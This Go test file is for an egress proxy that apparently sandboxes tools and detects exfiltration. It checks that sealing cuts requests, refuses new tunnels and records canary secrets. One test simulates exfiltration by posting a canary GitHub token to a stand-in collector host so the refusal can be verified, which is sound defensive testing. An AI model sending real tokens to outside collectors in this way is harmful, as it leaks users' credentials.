package egress

import (
	"context"
	"io"
	"net/http"
	"net/http/httptest"
	"slices"
	"strings"
	"testing"

	"github.com/JairJosafath/mcp-customs/src/internal/canary"
)

func TestSealEmptiesTheAllowlistForGoodAndCanBeRepeated(t *testing.T) {
	e := New(Config{Allow: []string{"api.weather.example"}, InstallAllow: RegistryHosts})
	e.Installing(true)
	e.Seal()
	e.Seal()
	if got := e.Allow("api.weather.example", "collector.example"); len(got) != 0 {
		t.Errorf("Allow after the seal = %v, want an empty allowlist", got)
	}
	e.Installing(true)
	for _, h := range []string{"api.weather.example", "collector.example", "registry.npmjs.org"} {
		if e.isAllowed(h) {
			t.Errorf("%s is allowed after the seal", h)
		}
	}
}

// within waits for ch, failing the test after observeWithin rather than
// hanging until go test's deadline.
func within[T any](t *testing.T, ch <-chan T, what string) T {
	t.Helper()
	ctx, cancel := context.WithTimeout(t.Context(), observeWithin)
	defer cancel()
	select {
	case v := <-ch:
		return v
	case <-ctx.Done():
		t.Fatalf("%s did not happen within %v", what, observeWithin)
		var zero T
		return zero
	}
}

func TestSealClearsTheInstallTimeRegistryHosts(t *testing.T) {
	e := New(Config{InstallAllow: RegistryHosts})
	e.Installing(true)
	if !e.isAllowed("registry.npmjs.org") {
		t.Fatal("the registry is not allowed while an install runs")
	}
	e.Seal()
	e.mu.Lock()
	installing, registries := e.installing, len(e.install)
	e.mu.Unlock()
	if installing || registries != 0 {
		t.Errorf("after the seal installing = %v with %d registry hosts, want neither", installing, registries)
	}
}

// heldUpstream holds every request it is sent until the request's context
// ends, and says when one arrives. When the test ends first, it lets go,
// so a seal that cuts nothing fails the test instead of hanging it.
type heldUpstream struct {
	arrived chan struct{}
	cut     chan struct{}
	test    context.Context
}

func (h *heldUpstream) RoundTrip(r *http.Request) (*http.Response, error) {
	h.arrived <- struct{}{}
	select {
	case <-r.Context().Done():
		close(h.cut)
		return nil, r.Context().Err()
	case <-h.test.Done():
		return nil, h.test.Err()
	}
}

func TestSealCutsARequestBeingSentOn(t *testing.T) {
	ca := newCA(t)
	up := &heldUpstream{arrived: make(chan struct{}, 1), cut: make(chan struct{}), test: t.Context()}
	e := New(Config{CA: ca, Upstream: up, Allow: []string{"api.weather.example"}})
	proxy := httptest.NewServer(e.Proxy())
	t.Cleanup(proxy.Close)
	done := make(chan int, 1)
	go func() {
		resp, err := proxyClient(proxy.URL, ca).Get("http://api.weather.example/slow")
		if err != nil {
			done <- 0
			return
		}
		_ = resp.Body.Close()
		done <- resp.StatusCode
	}()
	within(t, up.arrived, "the request reaching the upstream")
	sealed := make(chan struct{})
	go func() {
		e.Seal()
		close(sealed)
	}()
	within(t, up.cut, "the seal cutting the request")
	within(t, sealed, "the seal answering")
	if status := within(t, done, "the client's answer"); status != http.StatusBadGateway {
		t.Errorf("the request being sent on answered %d, want 502: the seal cuts it", status)
	}
}

func TestAfterTheSealNoRequestLeavesAndNoTunnelIsMadeButBothAreSearched(t *testing.T) {
	ca := newCA(t)
	up := &fakeUpstream{}
	rec := newRecorded()
	e := New(Config{CA: ca, Upstream: up, Allow: []string{"api.weather.example"}})
	e.Observe(rec.observe)
	e.SetCanaries(testCanaries)
	proxy := httptest.NewServer(e.Proxy())
	t.Cleanup(proxy.Close)
	client := proxyClient(proxy.URL, ca)
	token := testCanaries.Get(canary.GitHubToken)
	post := func(url string) (*http.Response, error) {
		return client.Post(url, "text/plain", strings.NewReader("token="+token))
	}

	// A tunnel opened before the seal stays open, kept alive.
	resp, err := post("https://api.weather.example/before")
	if err != nil {
		t.Fatal(err)
	}
	_, _ = io.Copy(io.Discard, resp.Body)
	_ = resp.Body.Close()
	e.Seal()

	resp, err = post("https://api.weather.example/after")
	if err != nil {
		t.Fatal(err)
	}
	body, _ := io.ReadAll(resp.Body)
	_ = resp.Body.Close()
	if string(body) != fakeBody {
		t.Errorf("a request in an open tunnel after the seal got %q, want the fake answer", body)
	}
	if resp, err := post("https://collector.example/new"); err == nil {
		_ = resp.Body.Close()
		t.Error("a new tunnel after the seal was made, want it refused")
	}
	if len(up.got) != 1 || !strings.Contains(up.got[0], "/before") {
		t.Errorf("the real hosts got %q, want only the request from before the seal", up.got)
	}
	requests := rec.of(KindHTTP)
	last, ok := requests[len(requests)-1].(HTTPDetail)
	if !ok || last.Path != "/after" || last.Allowed || len(last.Canaries) == 0 {
		t.Errorf("the request after the seal was recorded as %+v, want not allowed, with its canary", requests[len(requests)-1])
	}
	refused := slices.ContainsFunc(rec.of(KindConnect), func(o any) bool {
		d, ok := o.(ConnectDetail)
		return ok && d.Host == "collector.example" && d.Refused && !d.Allowed
	})
	if !refused {
		t.Errorf("connect observations %+v, want the new tunnel recorded as refused", rec.of(KindConnect))
	}
}

func TestARequestAllowedBeforeTheSealNeverReachesTheHostAfterSealReturns(t *testing.T) {
	ca := newCA(t)
	up := &fakeUpstream{}
	rec := newRecorded()
	e := New(Config{CA: ca, Upstream: up, Allow: []string{"api.weather.example"}})
	e.Observe(rec.observe)
	e.SetCanaries(testCanaries)
	// The server slows the search of its request, as a large body does,
	// so the seal comes between the allow decision and the send.
	searched, release := make(chan struct{}), make(chan struct{})
	e.beforePass = func() {
		close(searched)
		<-release
	}
	proxy := httptest.NewServer(e.Proxy())
	t.Cleanup(proxy.Close)
	done := make(chan struct{})
	go func() {
		defer close(done)
		resp, err := proxyClient(proxy.URL, ca).Post("http://api.weather.example/late", "text/plain", strings.NewReader(testCanaries.Get(canary.GitHubToken)))
		if err == nil {
			_ = resp.Body.Close()
		}
	}()
	within(t, searched, "the request's search")
	sealReturned := make(chan struct{})
	go func() {
		e.Seal()
		close(sealReturned)
	}()
	within(t, e.sealed.Done(), "the seal starting")
	close(release)
	within(t, sealReturned, "the seal answering")
	recorded := slices.ContainsFunc(rec.of(KindHTTP), func(o any) bool {
		d, ok := o.(HTTPDetail)
		return ok && d.Path == "/late" && len(d.Canaries) > 0
	})
	within(t, done, "the client's answer")
	up.mu.Lock()
	got := slices.Clone(up.got)
	up.mu.Unlock()
	if len(got) != 0 {
		t.Errorf("the real host got %q after the seal, want nothing", got)
	}
	if !recorded {
		t.Error("the request was not recorded, with its canary, by the time the seal answered")
	}
}

func TestARequestAllowedBeforeTheSealIsRecordedByTheTimeSealReturns(t *testing.T) {
	ca := newCA(t)
	rec := newRecorded()
	e := New(Config{CA: ca, Upstream: &fakeUpstream{}, Allow: []string{"api.weather.example"}})
	e.Observe(rec.observe)
	e.SetCanaries(testCanaries)
	// The server slows the search of its request, as a large body does:
	// it is allowed, and not yet recorded, when the seal comes.
	admitted, release := make(chan struct{}), make(chan struct{})
	e.afterAdmit = func() {
		close(admitted)
		<-release
	}
	proxy := httptest.NewServer(e.Proxy())
	t.Cleanup(proxy.Close)
	done := make(chan struct{})
	go func() {
		defer close(done)
		resp, err := proxyClient(proxy.URL, ca).Post("http://api.weather.example/held", "text/plain", strings.NewReader(testCanaries.Get(canary.GitHubToken)))
		if err == nil {
			_ = resp.Body.Close()
		}
	}()
	within(t, admitted, "the request being allowed")
	sealReturned := make(chan struct{})
	go func() {
		e.Seal()
		close(sealReturned)
	}()
	within(t, e.sealed.Done(), "the seal starting")
	close(release)
	within(t, sealReturned, "the seal answering")
	// Read once, right as Seal returns: the Checker's last read.
	recorded := slices.ContainsFunc(rec.of(KindHTTP), func(o any) bool {
		d, ok := o.(HTTPDetail)
		return ok && d.Path == "/held" && len(d.Canaries) > 0
	})
	within(t, done, "the client's answer")
	if !recorded {
		t.Error("the request allowed before the seal was not recorded, with its canary, by the time Seal returned")
	}
}
